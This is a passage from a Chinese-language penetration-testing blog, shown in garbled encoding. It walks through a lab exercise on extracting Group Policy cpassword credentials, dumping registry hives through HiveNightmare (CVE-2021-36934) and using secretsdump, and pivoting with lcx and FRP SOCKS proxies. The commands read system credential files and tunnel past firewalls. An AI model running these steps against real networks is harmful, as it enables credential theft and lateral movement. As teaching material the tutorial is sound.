alt="image.png"></p><h4 id="2-è·å–ç»„ç­–ç•¥å‡­æ®"><a href="#2-è·å–ç»„ç­–ç•¥å‡­æ®" class="headerlink" title="2.è·å–ç»„ç­–ç•¥å‡­æ®"></a>2.è·å–ç»„ç­–ç•¥å‡­æ®</h4><p>åœ¨Windows Server 2008ä¸­å¼•å…¥äº†ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼Œå…è®¸ç½‘ç»œç®¡ç†å‘˜å¯¹æŒ‡å®šè®¡ç®—æœºå’Œç”¨æˆ·é…ç½®ç‰¹å®šçš„è®¾ç½®ã€‚<br>åœ¨å¤§å‹åŸŸç¯å¢ƒä¸­ï¼Œç½‘ç»œç®¡ç†å‘˜å¾€å¾€ä¼šé€šè¿‡ä¸‹å‘ç»„ç­–ç•¥çš„æ–¹å¼å¯¹æ‰€æœ‰åŠ å…¥åŸŸçš„è®¡ç®—æœºçš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç è¿›è¡Œæ‰¹é‡ä¿®æ”¹ã€‚</p><p>åœ¨æ–°å»ºä¸€ä¸ªç»„ç­–ç•¥åï¼ŒåŸŸæ§ä¼šè‡ªåŠ¨åœ¨SYSVOLå…±äº«ç›®å½•ç”Ÿæˆä¸€ä¸ªXMLå­˜æ”¾æ›´æ–°åçš„å¯†ç ã€‚</p><p>SYSVOLæ˜¯åœ¨å®‰è£…æ´»åŠ¨ç›®å½•æ—¶åˆ›å»ºçš„ä¸€ä¸ªç”¨äºå­˜å‚¨å…¬å…±æ–‡ä»¶æœåŠ¡å™¨å‰¯æœ¬çš„å…±äº«æ–‡ä»¶å¤¹ï¼Œä¸»è¦å­˜æ”¾ç™»å½•è„šæœ¬ã€ç»„ç­–ç•¥æ•°æ®åŠå…¶ä»–æ§åˆ¶å™¨éœ€è¦çš„åŸŸä¿¡æ¯ç­‰ï¼Œå¹¶åœ¨æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„åŸŸç”¨æˆ·æˆ–è€…åŸŸæ–°äººç”¨æˆ·æ–¹ä½å†…å…±äº«ã€‚</p><p>SYSVOLç›®å½•ä¸­æœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªåä¸ºâ€Groups.xmlâ€çš„æ–‡ä»¶ï¼Œå…¶ä¸­çš„cpasswordå­—æ®µä¿å­˜äº†ç»è¿‡AES256ç®—æ³•åŠ å¯†è¿‡åçš„å¯†ç </p><p>å¾®è½¯åœ¨2012å¹´å…¬å¸ƒäº†æ”¹å¯†ç çš„åŠ å¯†ç§é’¥ï¼Œä»»ä½•ç»è¿‡è®¤è¯çš„ç”¨æˆ·éƒ½å¯ä»¥è¯»å–ä¿å­˜åœ¨XMLæ–‡ä»¶ä¸­çš„å¯†ç ï¼Œå¹¶é€šè¿‡ç§é’¥å°†å…¶è§£å¯†ã€‚ç”±äºé€šè¿‡ç»„ç­–ç•¥æ‰¹é‡ä¿®æ”¹æœ¬åœ°ç®¡ç†å‘˜å¯†ç éƒ½æ˜¯ç›¸åŒçš„ï¼Œå¦‚æœè·å¾—ä¸€å°æœºå™¨çš„æœ¬åœ°ç®¡ç†å‘˜å¯†ç ï¼Œå°±å¯ä»¥è·å¾—æ•´ä¸ªåŸŸå†…æœºå™¨çš„ç®¡ç†æƒé™ã€‚</p><p>åˆ›å»ºç”¨æˆ·Testb,ç»„Testuser<br>Testbå¯†ç : 114514AAAwww<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131727752.png" alt="image.png"><br>Testbæ·»åŠ åˆ°Testuserç»„ä¸­<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131729212.png" alt="image.png"></p><p>SYSVOLç›®å½•ç”Ÿæˆä¸€ä¸ªXMLå­˜æ”¾æ›´æ–°åçš„å¯†ç ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131731474.png" alt="image.png"></p><p>Metasploitæ¡†æ¶å†…ç½® post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gppæ¨¡å—å¯ä»¥è‡ªåŠ¨åŒ–æœç´¢ä½äºSYSVOLå…±äº«ç›®å½•ä¸­çš„XMLï¼Œå¹¶ä»ä¸­è§£å¯†å‡ºç”¨æˆ·å¯†ç <br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131741622.png" alt="image.png"></p><h4 id="3-HiveNightmare-CVE-2021-36934"><a href="#3-HiveNightmare-CVE-2021-36934" class="headerlink" title="3.HiveNightmare(CVE-2021-36934)"></a>3.HiveNightmare(CVE-2021-36934)</h4><p>Windowsçš„ACL(æ–‡ä»¶çš„è®¿é—®æ§åˆ¶åˆ—è¡¨)è¿‡äºå®½æ¾ï¼Œä½¿å¾—å¤šä¸ªæ ‡å‡†ç”¨æˆ·éƒ½å¯ä»¥ä»ç³»ç»Ÿå·å½±å‰¯æœ¬ä¸­è¯»å–åŒ…æ‹¬SAMã€SYSTEMã€SECURITYåœ¨å†…çš„å¤šä¸ªç³»ç»Ÿæ–‡ä»¶ã€‚ç”±äºSAMæ–‡ä»¶æ—¶å­˜å‚¨ç”¨æˆ·å¯†ç å“ˆå¸Œå€¼çš„å®‰å…¨è´¦æˆ·ç®¡ç†å™¨ï¼Œè¿›è€Œå¯ä»¥è·å–æ‰€æœ‰æœ¬åœ°ç”¨æˆ·NTLM Hashå€¼ï¼Œé€šè¿‡æš´åŠ›ç ´è§£æˆ–è€…Hashä¼ é€’ç­‰æ–¹æ³•å°±èƒ½å®ç°æœ¬åœ°æƒé™æå‡ã€‚</p><p>è¯¥æ¼æ´å½±å“Windows 10 Version 1809å‘å¸ƒä»¥æ¥çš„æ‰€æœ‰Windowsç‰ˆæœ¬ï¼ŒåŒ…æ‹¬Windows 11</p><p>ä»¥Windows10ä¸ºä¾‹æ¼”ç¤ºï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼šå·²å¯ç”¨ç³»ç»Ÿä¿æŠ¤ï¼Œç³»ç»Ÿä¸Šå­˜åœ¨å·²åˆ›å»ºçš„ç³»ç»Ÿè¿˜åŸç‚¹ï¼Œç³»ç»Ÿå¯ç”¨æœ¬åœ°ç®¡ç†å‘˜ç”¨æˆ·ã€‚</p><p>ç³»ç»Ÿä¿æŠ¤åœ¨Windowsæ“ä½œç³»ç»Ÿä¸­é»˜è®¤å¯ç”¨ï¼Œå¦‚æœå·²åˆ›å»ºç³»ç»Ÿè¿˜åŸç‚¹ï¼Œé‚£ä¹ˆæ ‡å‡†ç”¨æˆ·å¯ç›´æ¥ä»å·å½±å‰¯æœ¬ä¸­è®¿é—®å’Œè½¬å‚¨SAMã€SYSTEMã€SECURITYæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶é»˜è®¤è·¯å¾„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br><span class="line">C:\Windows\System32\config\SECURITY</span><br><span class="line">C:\Windows\System32\config\SYSTEM</span><br></pre></td></tr></table></figure><p>1.ä»¥æ ‡å‡†ç”¨æˆ·æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure><p>è‹¥è¾“å‡ºBUILTIN\Users:(I)(RX),åˆ™ç³»ç»Ÿæ˜“å—æ”»å‡»,å¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131747740.png" alt="image.png"></p><p>2.å°†ç¼–è¯‘å¥½çš„exp HiveNightmare.exe ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºã€‚ç›´æ¥è¿è¡Œåå³å¯å°†SAM\SYSTEM\SECURITY è½¬å‚¨åˆ°å½“å‰ç›®å½•<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309131824462.png" alt="image.png"></p><p>3.å°†ä¸‰ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°æœ¬åœ°ï¼Œä½¿ç”¨Impackerä¸­çš„secretsdump.pyå¯¼å‡ºSAMæ–‡ä»¶ä¸­ç”¨æˆ·çš„å“ˆå¸Œå€¼<br>é¡¹ç›®åœ°å€<a href="https://github.com/fortra/impacket/blob/3f645107bb4db65fd8a328399031a257723c6bfb/examples/secretsdump.py#L4">https://github.com/fortra/impacket/blob/3f645107bb4db65fd8a328399031a257723c6bfb/examples/secretsdump.py#L4</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam SAM-2022-01-18 -system SYSTEM-2022-01-18 -security SECURITY-2022-01-18 LOCAL</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å“ˆå¸Œå€¼åå¯ä»¥æš´åŠ›ç ´è§£ï¼Œä¹Ÿå¯ä»¥å“ˆå¸Œä¼ é€’</p><p>(ä¼šé¸½å¾ˆé•¿ä¸€æ®µæ—¶é—´å†å›æ¥æ›´å†…ç½‘)</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŸŸæ¸—é€(ä¸‰)-ç«¯å£è½¬å‘ä¸å†…ç½‘ä»£ç†</title>
      <link href="/2023/09/06/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%89)-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/"/>
      <url>/2023/09/06/%E5%9F%9F%E6%B8%97%E9%80%8F(%E4%B8%89)-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E4%B8%8E%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç«¯å£è½¬å‘å’Œä»£ç†"><a href="#1-ç«¯å£è½¬å‘å’Œä»£ç†" class="headerlink" title="1.ç«¯å£è½¬å‘å’Œä»£ç†"></a>1.ç«¯å£è½¬å‘å’Œä»£ç†</h2><h4 id="1-æ­£å‘è¿æ¥å’Œåå‘è¿æ¥"><a href="#1-æ­£å‘è¿æ¥å’Œåå‘è¿æ¥" class="headerlink" title="1.æ­£å‘è¿æ¥å’Œåå‘è¿æ¥"></a>1.æ­£å‘è¿æ¥å’Œåå‘è¿æ¥</h4><p>1.æ­£å‘è¿æ¥<br>æ­£å‘è¿æ¥å°±æ˜¯å—æ§ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±æ§åˆ¶ç«¯ä¸»æœºä¸»åŠ¨å»è¿æ¥å—æ§ç«¯ä¸»æœºçš„è¿‡ç¨‹ï¼Œé€‚ç”¨äºå—æ§ä¸»æœºå…·æœ‰å…¬ç½‘IPçš„æƒ…å†µä¸‹ã€‚</p><p>2.åå‘è¿æ¥<br>åå‘è¿æ¥æ˜¯æ§åˆ¶ç«¯ä¸»æœºç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œç”±å—æ§ç«¯ä¸»æœºåå‘å»è¿æ¥æ§åˆ¶ç«¯ä¸»æœºçš„è¿‡ç¨‹ï¼Œé€‚ç”¨äºå—æ§ç«¯ä¸»æœºæ²¡æœ‰å…¬ç½‘IPçš„æƒ…å†µã€‚</p><p>åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œæ­£å‘è¿æ¥å¾€å¾€å—é™äºå—æ§ä¸»æœºä¸Šçš„é˜²ç«å¢™å±è”½åŠæƒé™ä¸è¶³ç­‰æƒ…å†µï¼Œ<br>è€Œåå‘è¿æ¥å¯ä»¥å¾ˆå¥½åœ°çªç ´è¿™äº›é™åˆ¶ã€‚</p><h4 id="2-ç«¯å£è½¬å‘ä¸æ˜ å°„"><a href="#2-ç«¯å£è½¬å‘ä¸æ˜ å°„" class="headerlink" title="2.ç«¯å£è½¬å‘ä¸æ˜ å°„"></a>2.ç«¯å£è½¬å‘ä¸æ˜ å°„</h4><p>ç«¯å£è½¬å‘(Port Forwarding)æ˜¯ç½‘ç»œåœ°å€è½¬æ¢(NAT)çš„ä¸€ç§åº”ç”¨ã€‚é€šè¿‡ç«¯å£è½¬å‘ï¼Œä¸€ä¸ªç½‘ç»œç«¯å£ä¸Šæ”¶åˆ°çš„æ•°æ®å¯ä»¥è¢«è½¬å‘ç»™å¦ä¸€ä¸ªç½‘ç»œç«¯å£ã€‚è½¬å‘çš„ç«¯å£å¯ä»¥æ˜¯æœ¬æœºçš„ç«¯å£ï¼Œä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ä¸»æœºä¸Šçš„ç«¯å£ã€‚</p><p>å†…ç½‘é˜²ç«å¢™ä¼šæ£€æŸ¥æ•æ„Ÿç«¯å£çš„è¿æ¥æƒ…å†µï¼Œå¦‚æœè¿æ¥å­˜åœ¨å¼‚æ ·ä¼šé˜»æ–­é€šä¿¡ã€‚é€šè¿‡ç«¯å£è½¬å‘å¯ä»¥å°†æ•æ„Ÿç«¯å£æ•°æ®è½¬å‘åˆ°é˜²ç«å¢™å…è®¸çš„ç«¯å£ä¸Šï¼Œå»ºç«‹é€šä¿¡éš§é“ï¼Œç»•è¿‡é˜²ç«å¢™ã€‚</p><p>ç«¯å£æ˜ å°„(Port Mapping)ä¹Ÿæ˜¯ç½‘ç»œåœ°å€è½¬æ¢(NAT)çš„ä¸€ç§åº”ç”¨ï¼Œç”¨äºæŠŠå…¬ç½‘çš„åœ°å€ç¿»è¯‘æˆç§æœ‰åœ°å€ã€‚ç«¯å£æ˜ å°„å¯ä»¥å°†å¤–ç½‘ä¸»æœºæ”¶åˆ°çš„è¯·æ±‚æ˜ å°„åˆ°å†…ç½‘ä¸»æœºä¸Šï¼Œä½¿å¾—æ²¡æœ‰å…¬ç½‘Påœ°å€çš„å†…ç½‘ä¸»æœºèƒ½å¤Ÿå¯¹å¤–æä¾›ç›¸åº”çš„æœåŠ¡ã€‚</p><p>æ ¹æ®ç›¸å…³èµ„æ–™,ç«¯å£è½¬å‘ä¸ç«¯å£æ˜ å°„çš„æ¦‚å¿µå¹¶æ²¡æœ‰ä¸¥æ ¼çš„æœ¯è¯­è§£é‡Šã€‚  </p><h4 id="3-SOCKSä»£ç†"><a href="#3-SOCKSä»£ç†" class="headerlink" title="3.SOCKSä»£ç†"></a>3.SOCKSä»£ç†</h4><p>SOCKSæ˜¯ä¸€ç§ä»£ç†åè®®ï¼Œå…¶ç«¯å£ä¸º1080ï¼Œæœ‰SOCKS4å’ŒSOCKS5ä¸¤ä¸ªç‰ˆæœ¬ã€‚<br>SOCKS4åªæ”¯æŒTCPã€‚SOCKS5å¯ä»¥æ”¯æŒTCPã€UDPå’Œå„ç§èº«ä»½éªŒè¯æœºåˆ¶ç­‰åè®®ã€‚</p><p>é‡‡ç”¨SOCKSåè®®çš„ä»£ç†æœåŠ¡å™¨è¢«ç§°ä¸ºSOCKSæœåŠ¡å™¨ï¼Œè¿™æ˜¯ä¸€ç§é€šç”¨çš„ä»£ç†æœåŠ¡å™¨ï¼Œåœ¨ç½‘ç»œé€šä¿¡ä¸­æ‰®æ¼”ç€ä¸€ä¸ªè¯·æ±‚ä»£ç†äººçš„è§’è‰²ã€‚</p><p>å†…ç½‘æ¸—é€ä¸­é€šè¿‡æ­å»ºSOCKSä»£ç†å¯ä»¥ä¸ç›®æ ‡å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡ã€‚</p><h2 id="2-å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·"><a href="#2-å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·" class="headerlink" title="2.å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·"></a>2.å¸¸è§è½¬å‘ä¸ä»£ç†å·¥å…·</h2><h3 id="1-LCX"><a href="#1-LCX" class="headerlink" title="1.LCX"></a>1.LCX</h3><p>lcxåŸºäºSocketå¥—æ¥å­—ï¼Œå¾ˆå¤šæ€è½¯å·²å°†LcxåŠ å…¥ç‰¹å¾åº“ï¼Œå®é™…æ—¶éœ€è¦å…æ€ã€‚</p><p>ç½‘ä¸Šä¸‹è½½åœ°å€å¾ˆå¤š,æœ¬æ–‡æä¾›ä¸‹è½½åœ°å€:<a href="http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip">http://www.vuln.cn/wp-content/uploads/2016/06/lcx_vuln.cn_.zip</a></p><h4 id="1-ç›®æ ‡æœ‰å…¬ç½‘IP"><a href="#1-ç›®æ ‡æœ‰å…¬ç½‘IP" class="headerlink" title="1.ç›®æ ‡æœ‰å…¬ç½‘IP"></a>1.ç›®æ ‡æœ‰å…¬ç½‘IP</h4><p>å‡è®¾Windows Server 2012 å…·æœ‰å…¬ç½‘IP<br>Windows 7ä¸ºæµ‹è¯•äººå‘˜æ”»å‡»æœºã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061550799.png" alt="image.png"></p><p>æ­¤æ—¶å·²è·å–Windows Server2012çš„æ§åˆ¶æƒ,éœ€è¦ç™»å½•å…¶è¿œç¨‹æ¡Œé¢æŸ¥çœ‹æƒ…å†µ,ä½†æ˜¯é˜²ç«å¢™å¯¹3389ç«¯å£åšäº†é™åˆ¶,ä¸å…è®¸å¤–ç½‘æœºå™¨å¯¹3389ç«¯å£è¿›è¡Œè¿æ¥ã€‚</p><p>å¯ä»¥é€šè¿‡ç«¯å£è½¬å‘ï¼Œå°†3389ç«¯å£è½¬å‘åˆ°é˜²ç«å¢™å…è®¸çš„ç«¯å£ä¸Šï¼Œä¾‹å¦‚4444ç«¯å£ã€‚<br>Windows Server 2012ä¸Šè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 4444 127.0.0.1:3389</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061421607.png" alt="image.png"></p><p>æ”»å‡»æœºè¿æ¥4444ç«¯å£å³å¯è¿œç¨‹è¿æ¥<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061424751.png" alt="image.png"></p><p>æˆåŠŸè¿æ¥:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061433612.png" alt="image.png"></p><h4 id="2-ç«¯å£æ˜ å°„"><a href="#2-ç«¯å£æ˜ å°„" class="headerlink" title="2.ç«¯å£æ˜ å°„"></a>2.ç«¯å£æ˜ å°„</h4><p>ç¯å¢ƒ:<br>WebæœåŠ¡å™¨(Windows Server 2012)æœ‰ä¸¤ä¸ªç½‘å¡,å…¬ç½‘:192.168.89.10 Â å†…ç½‘:10.10.10.13<br>å†…ç½‘è¿˜å­˜åœ¨ä¸€å°MYSQLæœåŠ¡å™¨:10.10.10.15<br>å·²è·å–Windows Server 2012 çš„æ§åˆ¶æƒ,å¾—çŸ¥å†…ç½‘å­˜åœ¨MYSQLæœåŠ¡å™¨ä¸”è·å¾—Mysqlç™»å½•å‡­æ®<br>ç›®æ ‡:ç™»å½•MYSQLæœåŠ¡å™¨</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061554103.png" alt="image.png"></p><p>ç¯å¢ƒé…ç½®:<br>Windos Server 2012ä¸¤å—ç½‘å¡,<br>ä¸€å—é…192.168.89.10,å¦ä¸€å—é…10.10.10.13<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061449723.png" alt="image.png"></p><p>Windows 7ä¸€å—ç½‘å¡,ipé…ä¸º10.10.10.15<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061446655.png" alt="image.png"></p><p>è¿é€šæ€§æµ‹è¯•<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061450100.png" alt="image.png"></p><p>å°†MYSQLæœåŠ¡å™¨çš„3306ç«¯å£æ˜ å°„åˆ°Windows Server 2222ç«¯å£<br>Windows Server 2012æ‰§è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -tran 2222 10.10.10.15 3306</span><br></pre></td></tr></table></figure><p>ipä¸º192.168.89.20çš„æ”»å‡»æœºå€ŸåŠ©Navicatè¿æ¥Windows Server 2012 çš„2222ç«¯å£<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061457985.png" alt="image.png"><br>æˆåŠŸè¿æ¥:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061458961.png" alt="image.png"></p><h4 id="3-ç›®æ ‡æœºæ— å…¬ç½‘IP"><a href="#3-ç›®æ ‡æœºæ— å…¬ç½‘IP" class="headerlink" title="3.ç›®æ ‡æœºæ— å…¬ç½‘IP"></a>3.ç›®æ ‡æœºæ— å…¬ç½‘IP</h4><p>WebæœåŠ¡å™¨ 10.10.10.15æ— å…¬ç½‘IP, é€šè¿‡NATå¯¹å¤–æä¾›WebæœåŠ¡<br>å·²è·å¾—WebæœåŠ¡å™¨çš„ç™»å½•å‡­è¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061557228.png" alt="image.png"></p><p>æ— æ³•é€šè¿‡IPè®¿é—®MysqlæœåŠ¡å™¨.éœ€è¦å…¬ç½‘VPSå…ˆç›‘å¬ä¸€ä¸ªç«¯å£,å°†WebæœåŠ¡å™¨çš„3389ç«¯å£è½¬å‘åˆ°VPSçš„è¿™ä¸ªç«¯å£ä¸Šã€‚</p><p>å…¬ç½‘VPS ç›‘å¬æœ¬åœ°4444ç«¯å£,å¹¶å°†8888ç«¯å£æ¥æ”¶åˆ°çš„æ•°æ®è½¬å‘ç»™æœ¬åœ°çš„4444ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen 4444 8888</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061506755.png" alt="image.png"></p><p>MysqlæœåŠ¡å™¨ç”¨è‡ªå·±çš„3306ç«¯å£å»è¿æ¥VPSçš„8888ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 10.10.10.13 8888 127.0.0.1 3389</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061538621.png" alt="image.png"></p><p>æ”»å‡»æœºrdesktopè¿æ¥VPSçš„4444ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdesktop 192.168.89.10:4444</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¿æ¥:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061540382.png" alt="image.png"></p><h3 id="2-FRP"><a href="#2-FRP" class="headerlink" title="2.FRP"></a>2.FRP</h3><p>FRPæ˜¯ä¸€ä¸ªä¸“æ³¨äºå†…ç½‘ç©¿é€çš„é«˜æ€§èƒ½çš„åå‘ä»£ç†å¼•ç”¨,æ”¯æŒTCP,UDP,HTTP,HTTPSç­‰åè®®.<br>FRPæ”¯æŒæ­å»ºSOCKS5ä»£ç†åº”ç”¨</p><p>é¡¹ç›®åœ°å€:<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>FRPä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶:<br>Â frps , æœåŠ¡ç«¯ç¨‹åº , frps.ini , æœåŠ¡ç«¯é…ç½®æ–‡ä»¶;<br>Â frpc , å®¢æˆ·ç«¯ç¨‹åº , frpc.ini , å®¢æˆ·ç«¯é…ç½®æ–‡ä»¶;</p><p>æµ‹è¯•ç¯å¢ƒ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061628148.png" alt="image.png"><br>èµ„äº§è¡¨<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061629446.png" alt="image.png"></p><h4 id="1-ä¸€çº§ç½‘ç»œä»£ç†"><a href="#1-ä¸€çº§ç½‘ç»œä»£ç†" class="headerlink" title="1.ä¸€çº§ç½‘ç»œä»£ç†"></a>1.ä¸€çº§ç½‘ç»œä»£ç†</h4><p>å·²è·å–Windows Server2012 WebæœåŠ¡å™¨çš„æ§åˆ¶æƒ,è·å–FTPæœåŠ¡å™¨çš„SSHç™»å½•å‡­æ®<br>ç›®æ ‡:ç»§ç»­æ¸—é€å¹¶ç™»å½•FTPæœåŠ¡å™¨çš„SSH<br>é€”å¾„: Windows Server 2012ä¸Šä½¿ç”¨FRPæ­å»ºSOCKS5ä»£ç†æœåŠ¡<br>1.VPS(Ubuntu 20.04 192.168.2.x)ä½œä¸ºFRPæœåŠ¡ç«¯,æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨FRPæœåŠ¡ç«¯ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br></pre></td></tr></table></figure><p>frps.iniæ–‡ä»¶å†…å®¹å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_addr = 0.0.0.0    #æœåŠ¡ç«¯ä¸Šç»‘å®šçš„ip</span><br><span class="line">bind_port = 7000       #æœåŠ¡å™¨ä¸Šç»‘å®šçš„ç«¯å£</span><br></pre></td></tr></table></figure><p>å¡«å†™é…ç½®æ–‡ä»¶æ—¶éœ€è¦å°†æ³¨é‡Šåˆ æ‰</p><p>2.Windows Server 2012ä½œä¸ºFRPå®¢æˆ·ç«¯,æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å¯åŠ¨å®¢æˆ·ç«¯ç¨‹åº:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\frpc.exe -c .\frpc.ini</span><br></pre></td></tr></table></figure><p>frpc.iniæ–‡ä»¶å†…å®¹å¦‚ä¸‹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.2.x      #æŒ‡å‘FrpæœåŠ¡å™¨ç»‘å®šçš„IPåœ°å€</span><br><span class="line">server_port = 7000             #æŒ‡å‘FrpæœåŠ¡å™¨ç»‘å®šçš„ç«¯å£</span><br><span class="line">[socks5]</span><br><span class="line">remote_port = 1080             #ä»£ç†æ‰€ä½¿ç”¨çš„ç«¯å£,ä¼šè¢«è½¬å‘åˆ°æœåŠ¡å™¨</span><br><span class="line">plugin = socks5                #ä»£ç†çš„ç±»å‹</span><br></pre></td></tr></table></figure><p>æˆåŠŸåœ¨Windows Server 2012 ä¸VPSä¹‹é—´æ­å»ºäº†ä¸€ä¸ªSOCKS5ä»£ç†æœåŠ¡ã€‚å¯ä»¥å€ŸåŠ©ç¬¬ä¸‰æ–¹å·¥å…·è®©è®¡ç®—æœºçš„å…¶ä»–åº”ç”¨ä½¿ç”¨è¿™ä¸ªSOCKS5ä»£ç†,å¦‚ProxyChainsã€Proxifierç­‰ã€‚</p><p>ä»¥ProxyChainsä¸ºä¾‹ã€‚ProxyChainsæ˜¯ä¸€æ¬¾å¯ä»¥åœ¨linuxä¸‹å®ç°å…¨å±€ä»£ç†çš„è½¯ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»»ä½•åº”ç”¨ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œå…è®¸TCPå’ŒDNSæµé‡é€šè¿‡ä»£ç†éš§é“,æ”¯æŒHTTPã€SOCKS4ã€SOCKS5ç±»å‹ä»£ç†ã€‚</p><p>é¦–å…ˆç¼–è¾‘ProxyChainsé…ç½®æ–‡ä»¶ &#x2F;etc&#x2F;proxychains.conf, å°†SOCKS5ä»£ç†æœåŠ¡å™¨çš„åœ°å€æŒ‡å‘FRP æœåŠ¡ç«¯çš„åœ°å€ã€‚<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202309061641095.png" alt="image.png"></p><p>å‘½ä»¤è¡Œå‰åŠ ä¸Šâ€proxychainsâ€ ä¾¿å¯ä»¥ç”¨æ­¤SOCKS5ä»£ç†</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains ssh root@10.10.10.15</span><br></pre></td></tr></table></figure><p>é€šè¿‡SOCKS5ä»£ç†ç™»å½•FTPçš„SSH</p><h4 id="2-äºŒçº§ç½‘ç»œä»£ç†"><a href="#2-äºŒçº§ç½‘ç»œä»£ç†" class="headerlink" title="2.äºŒçº§ç½‘ç»œä»£ç†"></a>2.äºŒçº§ç½‘ç»œä»£ç†</h4><p>è·å–FTPæœåŠ¡å™¨æ§åˆ¶æƒå,ç»è¿‡ä¿¡æ¯æ”¶é›†,å‘ç°è¿˜æœ‰ä¸€ä¸ªç½‘æ®µä¸º192.168.30.0&#x2F;24çš„åŠå…¬åŒºç½‘ç»œ,éœ€è¦ç»§ç»­æ¸—é€å¹¶ç™»å½•æ–‡ä»¶æœåŠ¡å™¨çš„è¿œç¨‹æ¡Œé¢ã€‚ç”¨FRPåœ¨DMZåŒºä¸åŠå…¬åŒºä¹‹é—´æ­å»ºä¸€ä¸ªäºŒçº§ç½‘ç»œçš„SOCKS5ä»£ç†,ä»è€Œè®¿é—®åŠå…¬åŒºçš„æ–‡ä»¶æœåŠ¡å™¨ã€‚<br>1.VPSå¯åŠ¨FRPæœåŠ¡ç«¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./frps -c 